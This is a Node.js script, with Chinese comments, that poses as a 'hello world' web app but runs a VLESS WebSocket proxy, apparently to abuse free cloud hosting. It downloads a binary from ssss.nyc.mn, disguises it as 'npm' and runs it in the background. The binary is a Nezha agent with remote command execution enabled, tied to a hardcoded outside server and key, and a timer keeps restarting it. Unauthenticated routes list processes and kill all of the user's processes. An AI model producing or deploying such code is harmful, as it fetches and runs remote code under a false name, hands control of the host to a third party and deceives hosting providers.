const express = require("express");
const app = express();
const net = require('net');
const { WebSocket, createWebSocketStream } = require('ws');
const axios = require("axios");
const os = require('os');
const fs = require("fs");
const path = require("path");
const { promisify } = require('util');
const exec = promisify(require('child_process').exec);
const { execSync } = require('child_process');

const UUID = process.env.UUID || '9c7acc53-03cb-4fb6-b99b-c79af196c786';
const uuid = UUID.replace(/-/g, '');
const DOMAIN = process.env.DOMAIN || 'leapcell1.svip888.us.kg';
const NAME = process.env.NAME || 'SG-Webfreecloud-ws';
const NEZHA_SERVER = process.env.NEZHA_SERVER || 'rqnezha1.wuge.nyc.mn:80';
const NEZHA_PORT = process.env.NEZHA_PORT || '';
const NEZHA_KEY = process.env.NEZHA_KEY || 'XehG4tV7a95d8okpPr6n5C7KIRV58Fgb';

// ========== 哪吒配置文件处理 ==========
let configPath = '';
if (NEZHA_SERVER && NEZHA_KEY) {
    if (!NEZHA_PORT) {
        const port = NEZHA_SERVER.includes(':') ? NEZHA_SERVER.split(':').pop() : '';
        const tlsPorts = new Set(['443', '8443', '2096', '2087', '2083', '2053']);
        const nezhatls = tlsPorts.has(port) ? 'true' : 'false';

        const configYaml = `
client_secret: ${NEZHA_KEY}
debug: false
disable_auto_update: true
disable_command_execute: false
disable_force_update: true
disable_nat: false
disable_send_query: false
gpu: false
insecure_tls: false
ip_report_period: 180
report_delay: 4
self_update_period: 0
server: ${NEZHA_SERVER}
skip_connection_count: false
skip_procs_count: false
temperature: false
tls: ${nezhatls}
use_gitee_to_upgrade: false
use_ipv6_country_code: false
uuid: ${UUID}`;

        // 判断 __dirname 是否可写，否则使用 /tmp
        try {
            fs.accessSync(__dirname, fs.constants.W_OK);
            configPath = path.join(__dirname, 'config.yaml');
        } catch (err) {
            console.warn('__dirname 不可写，使用 /tmp 目录');
            configPath = '/tmp/config.yaml';
        }

        fs.writeFileSync(configPath, configYaml);
        console.log(`哪吒配置文件写入: ${configPath}`);
    }
}

// ========== 工具函数 ==========
function getSystemArchitecture() {
    const arch = os.arch();
    return ['arm', 'arm64', 'aarch64'].includes(arch) ? 'arm' : 'amd';
}

function getDownloadUrls() {
    const architecture = getSystemArchitecture();
    return architecture === 'arm' ? {
        npm: "https://arm64.ssss.nyc.mn/v1",
    } : {
        npm: "https://amd64.ssss.nyc.mn/v1",
    };
}

async function isProcessRunning(processName) {
    try {
        const cmd = `ps -eo pid,cmd | grep -E "[n]pm -c config.yaml" || true`;
        const { stdout } = await exec(cmd);
        return stdout.trim().length > 0;
    } catch (err) {
        console.error('检查进程出错:', err);
        return false;
    }
}

let isStartingProcess = false;

async function downloadFile(fileName, fileUrl) {
    const filePath = path.join(__dirname, fileName);

    if (fs.existsSync(filePath)) {
        console.log(`文件 ${fileName} 已存在`);
        return filePath;
    }

    console.log(`开始下载 ${fileName}...`);
    const writer = fs.createWriteStream(filePath);

    try {
        const response = await axios({
            url: fileUrl,
            method: 'GET',
            responseType: 'stream',
            timeout: 30000
        });

        response.data.pipe(writer);

        await new Promise((resolve, reject) => {
            writer.on('finish', resolve);
            writer.on('error', reject);
        });

        console.log(`${fileName} 下载完成`);
        await fs.promises.chmod(filePath, 0o755);
        return filePath;
    } catch (err) {
        if (fs.existsSync(filePath)) {
            await fs.promises.unlink(filePath);
        }
        throw new Error(`下载 ${fileName} 失败: ${err.message}`);
    }
}

async function ensureFile(fileName, fileUrl) {
    try {
        if (!fs.existsSync(fileName)) {
            console.log(`文件 ${fileName} 不存在，尝试下载...`);
            await downloadFile(fileName, fileUrl);
        }
        return true;
    } catch (err) {
        console.error(`文件 ${fileName} 确保失败:`, err);
        return false;
    }
}

// ========== 哪吒监控启动 ==========
async function runNezha() {
    if (!NEZHA_KEY) {
        console.log('哪吒监控配置不完整，跳过启动');
        return false;
    }

    const urls = getDownloadUrls();
    if (!await ensureFile('npm', urls.npm)) return false;

    try {
        if (await isProcessRunning('npm')) {
            console.log('哪吒监控已在运行，跳过启动');
            return true;
        }

        console.log('启动哪吒监控...');
        // 使用 configPath 路径
        const { stdout, stderr } = await exec(`./npm -c ${configPath} > npm.log 2>&1 &`);
        console.log('哪吒监控启动成功');
        return true;
    } catch (err) {
        console.error('哪吒监控启动失败:', err);
        return false;
    }
}

async function monitorAndRun() {
    const urls = getDownloadUrls();

    setInterval(async () => {
        if (isStartingProcess) {
            console.log('已有进程正在启动，跳过本次检查');
            return;
        }

        console.log('\n[监控周期开始]');

        if (!(await isProcessRunning('npm'))) {
            console.log('哪吒监控未运行，尝试重启...');
            isStartingProcess = true;

            try {
                await ensureFile('npm', urls.npm);
                await runNezha();
            } catch (err) {
                console.error('重启哪吒监控失败:', err);
            } finally {
                isStartingProcess = false;
            }
        }

        console.log('[监控周期结束]');
    }, 5 * 60 * 1000);
}

// ========== HTTP & WS ==========
app.get("/", (req, res) => {
    res.send("hello world");
});

app.get("/sub", (req, res) => {
    const vlessURL = `vless://${UUID}@${DOMAIN}:443?encryption=none&security=tls&sni=${DOMAIN}&type=ws&host=${DOMAIN}&path=%2F#${NAME}`;
    const base64Content = Buffer.from(vlessURL).toString('base64');
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end(base64Content + '\n');
});

app.get("/status", async (req, res) => {
    try {
        const { stdout } = await exec("ps -ef", { timeout: 5000 });
        res.type("html").send("<pre>命令行执行结果：\n" + stdout + "</pre>");
    } catch (err) {
        res.type("html").send("<pre>命令行执行错误：\n" + err + "</pre>");
    }
});

app.get("/killall", (req, res) => {
    const username = os.userInfo().username;
    console.warn(`Attempting to kill all processes for user: ${username}`);

    exec(`pkill -u ${username}`, (error, stdout, stderr) => {
        if (error) {
            console.error(`Failed to kill processes: ${error.message}`);
            res.status(500).send(`Failed to terminate all processes: ${error.message}`);
            return;
        }

        console.warn(`All processes for user ${username} were terminated`);
        res.send('All processes terminated successfully');
    });
});

app.use((req, res) => {
    res.status(404).type('text/plain').end('Not Found\n');
});

const server = app.listen(process.env.PORT || 0, () => {
    console.log(`Server is listening`);
});

const wss = new WebSocket.Server({ server });

wss.on('connection', (ws) => {
    ws.once('message', (msg) => {
        const [VERSION] = msg;
        const id = msg.slice(1, 17);
        if (!id.every((v, i) => v == parseInt(uuid.substr(i * 2, 2), 16))) return;

        let i = msg.slice(17, 18).readUInt8() + 19;
        const port = msg.slice(i, (i += 2)).readUInt16BE(0);
        const ATYP = msg.slice(i, (i += 1)).readUInt8();
        const host =
            ATYP == 1
                ? msg.slice(i, (i += 4)).join('.')
                : ATYP == 2
                ? new TextDecoder().decode(msg.slice(i + 1, (i += 1 + msg.slice(i, i + 1).readUInt8())))
                : ATYP == 3
                ? msg.slice(i, (i += 16)).reduce((s, b, i, a) => (i % 2 ? s.concat(a.slice(i - 1, i + 1)) : s), []).map((b) => b.readUInt16BE(0).toString(16)).join(':')
                : '';

        ws.send(new Uint8Array([VERSION, 0]));
        const duplex = createWebSocketStream(ws);

        net.connect({ host, port }, function () {
            this.write(msg.slice(i));
            duplex
                .on('error', () => {})
                .pipe(this)
                .on('error', () => {})
                .pipe(duplex);
        }).on('error', () => {});
    }).on('error', () => {});
});

// ========== 主启动 ==========
async function startServer() {
    console.log('=== 服务启动开始 ===');
    await runNezha();
    monitorAndRun();
    console.log('=== 服务启动完成 ===');
    console.log('提示: 程序将持续监控服务状态，自动修复问题');
}

process.on('unhandledRejection', (err) => console.error('未处理的Promise拒绝:', err));
process.on('uncaughtException', (err) => console.error('未捕获的异常:', err));
process.on('SIGINT', async () => {
    console.log('收到终止信号，清理进程...');
    try {
        await exec(`pkill -f "npm -c ${configPath}"`);
    } catch (err) {
        console.error('清理进程出错:', err);
    }
    process.exit(0);
});

setTimeout(() => {
    startServer().catch(err => {
        console.error('启动失败:', err);
        process.exit(1);
    });
}, 2000);
